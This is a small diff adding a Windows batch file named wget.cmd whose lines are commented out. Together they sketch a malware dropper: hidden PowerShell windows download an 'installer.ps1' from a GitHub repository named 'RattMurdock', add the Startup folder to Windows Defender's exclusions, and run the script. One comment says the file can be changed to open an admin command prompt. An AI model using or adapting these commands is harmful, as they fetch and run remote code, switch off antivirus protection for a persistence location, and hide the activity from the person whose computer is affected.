@@ -1,0 +1,8 @@
+----- from wget.cmd : 
+
+REM you can remove the 'powershell' to get an admin CMD
+@REM -WindowStyle Hidden
+@REM powershell powershell.exe -WindowStyle Hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/installer.ps1' -OutFile 'installer.ps1'" 
+@REM Add-Mpreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup";
+@REM powershell.exe -WindowStyle Hidden -file ./installer.ps1
+
